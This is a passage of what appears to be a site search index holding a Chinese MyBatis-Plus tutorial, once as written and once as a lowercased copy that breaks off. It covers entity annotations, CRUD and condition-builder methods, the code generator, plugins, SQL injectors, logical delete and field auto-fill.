/>\n</bean>\n\n\n1\n2\n3\n\n\n如果我们将该字段修改为false，那么MP并不会自动将驼峰命名进行匹配。我们还可以通过@TableFiled注解，用Value指定对应的数据库列名称。exist表示在数据库中有没有对应的字段存在，默认是在数据库中有对应的字段。如果对应的javaBean在表中没有相关的映射，那么在进行数据库操作时就会报错，我们将该字段的exist设置成false，就可以忽略这个字段。\n\n@TableField(value = "last_name")\nprivate String lastName;\n\n@TableField(exist = false)\nprivate Double salary;\n\n\n1\n2\n3\n4\n5\n\n\n那么对于我们的主键策略，和对应的表名称的映射，如果每个实体类都需要进行配置，则过于麻烦，MP提供了全局配置的方式。\n\n<bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n    <property name="dbColumnUnderline" value="true" />\n    \x3c!--全局配置 --\x3e\n    <property name="idType" value="0" />\n</bean>\n\n\n1\n2\n3\n4\n5\n\n\n我们配置了idType为0之后，会调用枚举类的getIdType方法，该方法根据我们传入的IdType的key去找对应的主键策略类型\n\n\n\n我们加上全局的配置之后，还需要将配置注入到sqlsession中，否则不会起作用。\n\n    <bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- 别名处理 --\x3e\n        <property name="typeAliasesPackage" value="com.pwddd.mp.beans" />\n        <property name="globalConfig" ref="globalConfiguration" />\n    </bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@TableName注解会指定实体类对应的表名称，我们在创建数据库表的时候通常会给表加上一些固定的表前缀，这会导致我们的实体类和表名称不对应。因此在MP中也提供了添加表前缀的全局配置。\n\n<property name="tablePrefix" value="tbl_" />\n\n\n1\n\n\n在Mybatis里面，在插入操作后如果需要获取mybatis插入之后数据的主键值，需要在mapper映射文件中的select标签里面设置两个标签值，一个是主键的自增，一个是我们返回到插入实体的javabean的对应属性。\n\nuseGeneratedKeys="true" keyProperty="userId"\n\n\n1\n\n\n**而在MybatisPlus中会自动将插入数据的主键值自动注入到我们的插入实体中。**不需要我们进行任何操作。\n\ninsert方法在进行插入操作时，会自动的判断插入字段对应的值是否为null，如果为null则在插入操作中就不插入该值了。如果我们需要全字段的插入值，我们需要使用insertAllColumn方法。\n\nDEBUG 02-23 15:36:22,520 ==>  Preparing: INSERT INTO tbl_employee ( last_name,email,gender,age ) VALUES ( ?,?,?,? )  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n\n# Update\n\nMP为我们提供了通用的update方法，updateById，和上面的insert一样，如果不传入对应的参数，则MP不会对该参数对应的数据库列值进行修改。同时MP还提供了类似insertAllColumns的方法updateAllColumnsById。\n\n@Test\npublic void testUpdate(){\n    Employee employee = new Employee();\n    employee.setId(1);\n    employee.setAge(11);\n    employee.setGender(1);\n    //        employee.setEmail("helo@qq.com");\n    //        employee.setLastName("haha");\n    //        employeeMapper.updateById(employee);\n    employeeMapper.updateAllColumnById(employee);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# Select\n\nMP提供了多个查询方法：\n\n * selectById\n * selecgtOne\n * selectBatchsIds\n * selectByMap\n * selectPage\n\n# selectById\n\n@Test\npublic void testSelect(){\n    Employee employee = employeeMapper.selectById(1);\n    System.out.println(employee);\n}\n\n//Employee{id=1, lastName=\'null\', email=\'null\', gender=1, age=11}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# selectOne\n\n如果我们需要其他的列进行查询，则不能使用selectById进行查询了。我们需要用实体类封装我们需要查询的条件，然后使用selectOne进行查询。MP会将我们封装的非空的属性充当查询的条件。\n\n@Test\npublic void testSelect(){\n    //        Employee employee = employeeMapper.selectById(1);\n    //        System.out.println(employee);\n    Employee employee = new Employee();\n    employee.setAge(25);\n    employee.setGender(0);\n    Employee employee1 = employeeMapper.selectOne(employee);\n    System.out.println(employee1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nDEBUG 02-23 15:53:07,967 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee WHERE gender=? AND age=?  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n如果存在匹配的多条数据，则查询将会报错。\n\n# selectBatchsIds\n\n通过多个Id进行批量的查询。\n\nList<Integer> list = new ArrayList<>();\nlist.add(1);\nlist.add(2);\nlist.add(6);\nSystem.out.println(employeeMapper.selectBatchIds(list));\n\n\n1\n2\n3\n4\n5\n\n\n查询语句:\n\nDEBUG 02-23 15:55:50,296 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee WHERE id IN ( ? , ? , ? )  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n# selectByMap\n\n通过map封装我们的查询条件，获得批量的结果。\n\nHashMap<String, Object> map = new HashMap<>();\n// 注意： map的key是数据库中对应的列名\nmap.put("last_name","zhangsan");\nmap.put("gender",1);\nSystem.out.println(employeeMapper.selectByMap(map));\n\n\n1\n2\n3\n4\n5\n\n\n需要注意的是，selectByMap接受的参数是一个columnMap，也就是说，我们在封装查询条件时，需要传入的map的key对应的是数据库中的列名称，而不是我们javabean的属性名。\n\n# selectPage\n\nselectPage是MP帮助我们方便的进行分页查询的方法。该方法有两个参数，一个是RowBounds,还有wapper条件查询器。其中RowBounds我们可以使用该类的子类Page\n\nList<T> selectPage(RowBounds var1, @Param("ew") Wrapper<T> var2);\n\n\n1\n\n\n使用方法：\n\nSystem.out.println(employeeMapper.selectPage(new Page<>(2, 2), null));\n\n\n1\n\n\n查询语句:\n\nDEBUG 02-23 16:05:17,595 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n我们发现，MP不是使用limit关键字进行分页的，MP底层还是利用RowBounds进行实现的。该分页是使用了内存分页的技术实现的，如果要使用物理分页，需要使用相关的分页插件。\n\n\n# delete\n\nMP提供的通用删除方法有如下几种：\n\n * deleteById\n * deleteByMap\n * deleteByBatchIds\n\n使用方法：\n\n//1. 根据id进行删除操作\nSystem.out.println(employeeMapper.deleteById(11));\n//2. 根据map封装删除条件\nHashMap<String, Object> map = new HashMap<>();\nmap.put("last_name","zhangsan");\nmap.put("id",10);\nSystem.out.println(employeeMapper.deleteByMap(map));\n\n//3. 批量删除操作\nArrayList<Integer> list = new ArrayList<>();\nlist.add(1);\nlist.add(2);\nlist.add(3);\nSystem.out.println(employeeMapper.deleteBatchIds(list));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# MP启动注入SQL的原理\n\n问题：xxxMapper继承了BaseMapper，BaseMapper中提供了相关的CRUD方法，那么必须还有SQL语句，最终还是通过Mybatis进行操作数据。\n\n 1. XXXMapper的本质是一个代理类的对象。\n 2. 在MapperProxy中有一个SQLSession，SQLSession我们能找到具体的SQLSessionFactory\n 3. 在SQLSessionFactory中有一个COnfiguration对象，该对象中会有MapStatedment对象，该对象封装了我们具体的查询语句。\n 4. 在MP中有一个SQL自动注入类：AutoSqlInjector，该类负责注入SQL语句。\n\n\n# 条件构造器\n\n现有一个需求，我们需要分页查询tbl_employee表中，年龄在18~50之间、性别为男、且姓名为 xx 的所有用户，这时候我们该如何实现上述需求呢？\n\nMyBatis : 需要在SQL映射文件中编写带条件查询的SQL,并基于PageHelper插件完成分页.\n\n实现以上一个简单的需求，往往需要我们做很多重复单调的工作。普通的Mapper能够解决这类痛点吗？\n\nMP: 依旧不用编写SQL语句, MP提供了功能强大的条件构造器EntityWrapper。\n\n条件构造器类似于Mybatis里面逆向工程中生成的xxxExample，我们可以使用Criteria进行查询，这种查询风格称之为QBC(Query by Criteria)，在MP中称为条件构造器。MP中有两种方式使用条件构造器，分别是EntityWrapper和Condition。两种方式使用基本类似。\n\n使用条件构造器完成增删改查：\n\n    @Test\n    public void QBC(){\n        // 使用EW进行分页查询\n        System.out.println(employeeMapper.selectPage(new RowBounds(1, 3),\n                new EntityWrapper<Employee>()\n                        .eq("last_name", "zhangsan")\n                        .orNew() // orNew会将前面所有的条件作为一个整体\n                        //                        .or() // or会和前面的条件并列\n                        .eq("gender", 0)\n        ));\n\n        // 使用EW查询列表\n        System.out.println(employeeMapper.selectList(new EntityWrapper<Employee>()\n                .eq("last_name", "zhangsan")\n                .between("age", 10, 20)\n        ));\n\n        // 使用EW条件更新\n        Employee employee = new Employee();\n        employee.setLastName("lisi");\n        employee.setGender(0);\n        employeeMapper.update(employee,new EntityWrapper<Employee>()\n                .eq("id",8)\n        );\n\n        //使用condition进行条件删除\n        employeeMapper.delete(\n                Condition.create()\n                        .eq("id",8)\n        );\n\n        // last orderby查询\n        System.out.println(employeeMapper.selectList(new EntityWrapper<Employee>()\n//                .orderDesc(Arrays.asList("age"))\n//                .orderAsc(Arrays.asList("age"))\n//                        .orderBy("age")\n                        .last("order by age desc")  // 容易造成SQL注入\n        ));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 活动记录 - ActiveRecord\n\nActive Record(活动记录)，是一种领域模型模式，特点是一个模型类对应关系型数据库中的一个表，而模型类的一个实例对应表中的一行记录。\n\n开启AR，需要让被查询的实体类继承Model类，并且实现相应的方法。方法返回主键。\n\npublic class Employee extends Model<Employee> {\n    @Override\n    protected Serializable pkVal() {\n        return id;\n    }\n\n\n1\n2\n3\n4\n5\n\n\n基础操作：\n\n1) 插入操作\npublic boolean insert()\n2) 修改操作\npublic boolean updateById()\n3) 查询操作\npublic T selectById()\npublic T selectById(Serializable id)\npublic List&lt;T> selectAll()\npublic List&lt;T> selectList(Wrapper wrapper)\npublic int selectCount(Wrapper wrapper)\n4) 删除操作\npublic boolean deleteById()\npublic boolean deleteById(Serializable id)\npublic boolean delete(Wrapper wrapper)\n5) 分页复杂操作\npublic Page&lt;T> selectPage(Page&lt;T> page, Wrapper&lt;T> wrapper)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n@Test\npublic void testAR(){\n    // 插入操作\n    Employee employee = new Employee();\n    employee.setLastName("lisi");\n    employee.setAge(23);\n    employee.setEmail("zhangsan@qq.com");\n    employee.setGender(1);\n    employee.insert();\n    //修改操作\n    employee.setId(7);\n    employee.updateById();\n    // 查询操作\n    System.out.println(employee.selectById());\n    System.out.println(employee.selectById(6));\n    System.out.println(employee.selectAll());\n    System.out.println(employee.selectList(new EntityWrapper().eq("last_name", "zhangsan")));\n    System.out.println(employee.selectCount(new EntityWrapper().eq("last_name", "zhangsan")));\n    //删除操作\n    employee.deleteById();\n    employee.deleteById(1);\n    employee.delete(new EntityWrapper().eq("id",20));\n\n    System.out.println(employee.selectPage(new Page<>(1, 2),\n                                           new EntityWrapper<Employee>().like("last_name", "%a%")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 代码生成器\n\nMP提供了大量的自定义设置，生成的代码完全能够满足各类型的需求\n\nMP的代码生成器和MybatisMBG代码生成器:\n\nMP 的代码生成器都是基于 java 代码来生成。\n\nMBG 基于 xml 文件进行代码生成。\n\nMyBatis的代码生成器可生成: 实体类、Mapper接口、Mapper映射文件\n\nMP的代码生成器可生成: 实体类(可以选择是否支持 AR)、Mapper接口、Mapper映射文件、 Service层、Controller层。\n\n添加依赖\n\n由于MP使用的是基于Apache的Velocity模板技术，因此需要引入相关的依赖包，同时也可以替换为其他的模板。并且需要添加日志相关的依赖。\n\n<dependency>\n <groupId>org.apache.velocity</groupId>\n <artifactId>velocity-engine-core</artifactId>\n <version>2.0</version>\n</dependency>\n\n<dependency>\n<groupId>org.slf4j</groupId>\n<artifactId>slf4j-api</artifactId>\n<version>1.7.7</version>\n</dependency>\n<dependency>\n<groupId>org.slf4j</groupId>\n<artifactId>slf4j-log4j12</artifactId>\n<version>1.7.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n生成代码\n\n@Test\npublic void testGenerator() {\n    /*全局配置*/\n    GlobalConfig config = new GlobalConfig();\n    config.setActiveRecord(true) /*是否支持AR模式*/\n        .setAuthor("JM") /*作者*/\n        .setOutputDir("E:\\\\Workspace\\\\Code\\\\Java\\\\study\\\\mybatisplus\\\\src\\\\main\\\\java")\n        /*生成路径*/\n        .setFileOverride(true)/*文件覆盖*/\n        .setServiceName("%sService") /*设置生成的service接口名  首字母是否为I*/\n        .setIdType(IdType.AUTO) /*主键策略*/\n        ;\n\n    /*数据源配置*/\n    DataSourceConfig dsConfig = new DataSourceConfig();\n    dsConfig.setDbType(DbType.MYSQL)\n        .setUrl("jdbc:mysql://localhost:3306/mybatisplus")\n        .setDriverName("com.mysql.jdbc.Driver")\n        .setUsername("root")\n        .setPassword("123456");\n    /*策略配置*/\n    StrategyConfig stConfig = new StrategyConfig();\n    stConfig.setCapitalMode(true) /* 全局大写命名*/\n        .setDbColumnUnderline(true) /*表名 字段名 是否使用下滑 线命名*/\n        .setNaming(NamingStrategy.underline_to_camel) /* 数据 库表映射到实体的命名策略*/\n        .setInclude("tbl_employee") /*生成的表*/\n        .setTablePrefix("tbl_"); // 表前缀\n    /*包名策略*/\n    PackageConfig pkConfig = new PackageConfig();\n    pkConfig.setParent("com.pwddd.mp")\n        .setController("controller")\n        .setEntity("beans")\n        .setService("service");\n    AutoGenerator ag = new\n        AutoGenerator().setGlobalConfig(config).setDataSource(dsConfig)\n        .setStrategy(stConfig)\n        .setPackageInfo(pkConfig);\n    ag.execute();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 插件\n\n\n# 分页插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册分页插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.PaginationInterceptor"></bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 执行分析插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册执行分析插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.SqlExplainInterceptor">\n            <property name="stopProceed" value="true"></property>\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 乐观锁插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册乐观锁插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.OptimisticLockerInterceptor">\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 执行分析插件\n\n\x3c!-- 插件注册 --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- 注册性能分析插件 --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.PerformanceInterceptor">\n            <property name="format" value="true"></property>\n            \x3c!-- <property name="maxTime" value="5"></property> --\x3e\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 测试代码\n\npublic class TestMP {\n    ApplicationContext ctx  = new ClassPathXmlApplicationContext("applicationContext.xml");\n    EmployeeMapper employeeMapper = ctx.getBean("employeeMapper",EmployeeMapper.class);\n\n    /**\n\t * 测试 乐观锁插件\n\t */\n\n    @Test\n    public void testOptimisticLocker() {\n        //更新操作\n        Employee employee = new Employee();\n        employee.setId(15);\n        employee.setLastName("TomAA");\n        employee.setEmail("tomAA@sina.com");\n        employee.setGender("1");\n        employee.setAge(22);\n        employee.setVersion(3);\n        employeeMapper.updateById(employee);\n\n    }\n\n    /**\n\t * 测试 性能分析插件\n\t */\n    @Test\n    public void testPerformance() {\n        Employee employee = new Employee();\n        employee.setLastName("玛利亚老师");\n        employee.setEmail("mly@sina.com");\n        employee.setGender("0");\n        employee.setAge(22);\n        employeeMapper.insert(employee);\n\n    }\n\n    /**\n\t * 测试SQL执行分析插件\n\t */\n    @Test\n    public void testSQLExplain() {\n\n        employeeMapper.delete(null);  // 全表删除\n    }\n\n    /**\n\t * 测试分页插件\n\t */\n    @Test\n    public void testPage() {\n        Page<Employee> page = new Page<>(1,1);\n        List<Employee > emps = \n            employeeMapper.selectPage(page, null);\n        System.out.println(emps);\n        System.out.println("===============获取分页相关的一些信息======================");\n        System.out.println("总条数:" +page.getTotal());\n        System.out.println("当前页码: "+  page.getCurrent());\n        System.out.println("总页码:" + page.getPages());\n        System.out.println("每页显示的条数:" + page.getSize());\n        System.out.println("是否有上一页: " + page.hasPrevious());\n        System.out.println("是否有下一页: " + page.hasNext());\n\n        //将查询的结果封装到page对象中\n        page.setRecords(emps);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n\n# 自定义全局操作\n\n\n# AutoSqlInjector\n\n根据MybatisPlus的AutoSqlInjector可以自定义各种你想要的sql ,注入到全局中，相当于自定义Mybatisplus自动注入的方法。\n\n 1. 在Mapper接口中定义相关的方法\n    \n    public interface EmployeeMapper extends BaseMapper<Employee> {\n        int deleteAll();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n 2. 扩展AutoSqlInjector.inject方法，实现Mapper接口中方法要注入的SQL\n    \n    public class MyInjector extends AutoSqlInjector {\n        @Override\n        public void inject(Configuration configuration, MapperBuilderAssistant builderAssistant, Class<?> mapperClass, Class<?> modelClass, TableInfo table) {\n            //将EmployeeMapper中定义的deleteAll， 处理成对应的MappedStatement对象，加入到configuration对象中。\n    \n            //注入的SQL语句\n            String sql = "delete from " +table.getTableName();\n            //注入的方法名   一定要与EmployeeMapper接口中的方法名一致\n            String method = "deleteAll" ;\n    \n            //构造SqlSource对象\n            SqlSource sqlSource = languageDriver.createSqlSource(configuration, sql, modelClass);\n    \n            //构造一个删除的MappedStatement\n            this.addDeleteMappedStatement(mapperClass, method, sqlSource);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. 在MP全局策略中，配置自定义注入器\n    \n    <bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n        <property name="dbColumnUnderline" value="true" />\n        \x3c!--全局配置 --\x3e\n        <property name="idType" value="0" />\n    \n        <property name="tablePrefix" value="tbl_" />\n        <property name="sqlInjector" ref="injector" />\n        </bean>\n    \n        <bean class="com.pwddd.mp.mpconfig.MyInjector" id="injector"/>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n\n# 逻辑删除\n\n假删除、逻辑删除: 并不会真正的从数据库中将数据删除掉，而是将当前被删除的这条数据中的一个逻辑删除字段置为删除状态。\n\n 1. 配置逻辑删除bean\n    \n    \x3c!-- 逻辑删除 --\x3e\n    \t<bean id="logicSqlInjector" class="com.baomidou.mybatisplus.mapper.LogicSqlInjector"></bean>\n    \n    \n    1\n    2\n    \n\n 2. 注入逻辑删除属性\n    \n    \x3c!-- 注入逻辑删除 --\x3e\n        <property name="sqlInjector" ref="logicSqlInjector" />\n    \n    \n    1\n    2\n    \n\n 3. 配置逻辑删除值\n    \n    \x3c!-- 注入逻辑删除全局值 --\x3e\n    <property name="logicDeleteValue" value = "-1"></property>\n    <property name="logicNotDeleteValue" value="1"></property>\n    \n    \n    1\n    2\n    3\n    \n\n 4. 在 POJO 的逻辑删除字段 添加 @TableLogic 注解\n    \n    @TableLogic\n    private Integer logic_flag;\n    \n    \n    1\n    2\n    \n\n 5. 执行删除，会在mp自带查询和更新方法的sql后面，追加『逻辑删除字段』=『LogicNotDeleteValue 默认值』\n\n 6. 删除方法: deleteById()和其他delete方法, 底层SQL调用的是update tbl_xxx set 『逻辑删除字段』=『logicDeleteValue 默认值』\n\n\n# 公共字段自动填充\n\nmetaobject: 元对象。是Mybatis提供的一个用于更加方便，更加优雅的访问对象的属性, 给对象的属性设置值的一个对象。还会用于包装对象。支持对Object 、Map、Collection等对象进行包装。\n\n 1. 配置自动填充bean，并注册属性\n    \n    \x3c!-- 公共字段填充 处理器 --\x3e\n    <bean id="myMetaObjectHandler" class="com.atguigu.mp.metaObjectHandler.MyMetaObjectHandler"> </bean>\n    \x3c!-- 注入公共字段填充处理器 --\x3e\n    <property name="metaObjectHandler" ref="myMetaObjectHandler"></property>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 编写相关类\n    \n    /**\n     * 自定义公共字段填充处理器\n     */\n    public class MyMetaObjectHandler extends MetaObjectHandler {\n    \t\n    \t/**\n    \t * 插入操作 自动填充\n    \t */\n    \t@Override\n    \tpublic void insertFill(MetaObject metaObject) {\n    \t\t//获取到需要被填充的字段的值\n    \t\tObject fieldValue = getFieldValByName("name", metaObject);\n    \t\tif(fieldValue == null) {\n    \t\t\tSystem.out.println("*******插入操作 满足填充条件*********");\n    \t\t\tsetFieldValByName("name", "weiyunhui", metaObject);\n    \t\t}\n    \t\t\n    \t}\n    \t/**\n    \t * 修改操作 自动填充\n    \t */\n    \t@Override\n    \tpublic void updateFill(MetaObject metaObject) {\n    \t\tObject fieldValue = getFieldValByName("name", metaObject);\n    \t\tif(fieldValue == null) {\n    \t\t\tSystem.out.println("*******修改操作 满足填充条件*********");\n    \t\t\tsetFieldValByName("name", "weiyh", metaObject);\n    \t\t}\n    \t}\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    \n\n 3. 自动填充时，如果我们规定的字段为null，则进行自动填充。\n\n\n# Idea插件\n\nMybaitsX插件，可以提供Mapper文件和对应接口之间的关联和跳转。',normalizedContent:'# mybatisplus\n\n> mybatis-plus(简称 mp),是一个 mybatis 的增强工具包，只做增强不做改变。 为简化开发工作、提高生产率而生我们的愿景是成为 mybatis最好的搭档，就像魂斗罗中的 1p、2p，基友搭配，效率翻倍。\n\n\n# 相关资源\n\nmybatis-plus (baomidou.com)\n\ngithub - mybatis-plus\n\n\n# 前期准备\n\n\n# 创建库表\n\n-- 创建库\ncreate database mp;\n-- 使用库\nuse mp;\n-- 创建表\ncreate table tbl_employee(\n id int(11) primary key auto_increment,\n last_name varchar(50),\n email varchar(50),\n gender char(1),\n age int\n);\ninsert into tbl_employee(last_name,email,gender,age) values(\'tom\',\'tom@atguigu.com\',1,22);\ninsert into tbl_employee(last_name,email,gender,age) values(\'jerry\',\'jerry@atguigu.com\',0,25);\ninsert into tbl_employee(last_name,email,gender,age) values(\'black\',\'black@atguigu.com\',1,30);\ninsert into tbl_employee(last_name,email,gender,age) values(\'white\',\'white@atguigu.com\',0,35);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 编写对应的javabean\n\npackage com.pwddd.mp.bean;\n\npublic class employee {\n    private integer id;\n    private string lastname;\n    private string email;\n    private integer gender;\n    private integer age;\n\n    @override\n    public string tostring() {\n        return "employee{" +\n                "id=" + id +\n                ", lastname=\'" + lastname + \'\\\'\' +\n                ", email=\'" + email + \'\\\'\' +\n                ", gender=" + gender +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public integer getid() {\n        return id;\n    }\n\n    public void setid(integer id) {\n        this.id = id;\n    }\n\n    public string getlastname() {\n        return lastname;\n    }\n\n    public void setlastname(string lastname) {\n        this.lastname = lastname;\n    }\n\n    public string getemail() {\n        return email;\n    }\n\n    public void setemail(string email) {\n        this.email = email;\n    }\n\n    public integer getgender() {\n        return gender;\n    }\n\n    public void setgender(integer gender) {\n        this.gender = gender;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n\n    public employee() {\n    }\n\n    public employee(integer id, string lastname, string email, integer gender, integer age) {\n        this.id = id;\n        this.lastname = lastname;\n        this.email = email;\n        this.gender = gender;\n        this.age = age;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# 导入依赖\n\n<dependencies>\n\n    \x3c!-- mp 依赖 --\x3e\n    <dependency>\n        <groupid>com.baomidou</groupid>\n        <artifactid>mybatis-plus</artifactid>\n        <version>2.3</version>\n    </dependency>\n    \x3c!--junit --\x3e\n    <dependency>\n        <groupid>junit</groupid>\n        <artifactid>junit</artifactid>\n        <version>4.9</version>\n    </dependency>\n    \x3c!-- log4j --\x3e\n    <dependency>\n        <groupid>log4j</groupid>\n        <artifactid>log4j</artifactid>\n        <version>1.2.17</version>\n    </dependency>\n    \x3c!-- c3p0 --\x3e\n    <dependency>\n        <groupid>com.mchange</groupid>\n        <artifactid>c3p0</artifactid>\n        <version>0.9.5.2</version>\n    </dependency>\n    \x3c!-- mysql --\x3e\n    <dependency>\n        <groupid>mysql</groupid>\n        <artifactid>mysql-connector-java</artifactid>\n        <version>5.1.37</version>\n    </dependency>\n    \x3c!-- spring --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-context</artifactid>\n        <version>4.3.10.release</version>\n    </dependency>\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-orm</artifactid>\n        <version>4.3.10.release</version>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# spring配置文件配置\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n        xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n        xmlns:context="http://www.springframework.org/schema/context"\n        xmlns:tx="http://www.springframework.org/schema/tx"\n        xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd\n        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd">\n        \x3c!-- 数据源 --\x3e\n    <context:property-placeholder location="classpath:db.properties"/>\n    <bean id="datasource" class="com.mchange.v2.c3p0.combopooleddatasource">\n        <property name="driverclass" value="${jdbc.driver}" />\n        <property name="jdbcurl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n        \x3c!-- 事务管理器 --\x3e\n    <bean id="datasourcetransactionmanager" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n        \x3c!-- 基于注解的事务管理 --\x3e\n    <tx:annotation-driven transaction-manager="datasourcetransactionmanager"/>\n            \x3c!-- 配置 sqlsessionfactorybean --\x3e\n\x3c!--      <bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">  --\x3e\n        \x3c!-- 数据源 --\x3e\n\n        <bean id="sqlsessionfactorybean" class="org.mybatis.spring.sqlsessionfactorybean">\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- 别名处理 --\x3e\n        <property name="typealiasespackage" value="com.pwddd.mp.beans" />\n    </bean>\n        \x3c!--\n        配置 mybatis 扫描 mapper 接口的路径\n        --\x3e\n    <bean class="org.mybatis.spring.mapper.mapperscannerconfigurer">\n        <property name="basepackage" value="com.pwddd.mp.mapper" />\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# log4j配置文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype log4j:configuration system "log4j.dtd">\n<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/">\n    <appender name="stdout" class="org.apache.log4j.consoleappender">\n        <param name="encoding" value="utf-8" />\n        <layout class="org.apache.log4j.patternlayout">\n            <param name="conversionpattern" value="%-5p %d{mm-dd hh:mm:ss,sss} %m (%f:%l) \\n" />\n        </layout>\n    </appender>\n    <logger name="java.sql">\n        <level value="debug" />\n    </logger>\n    <logger name="org.apache.ibatis">\n        <level 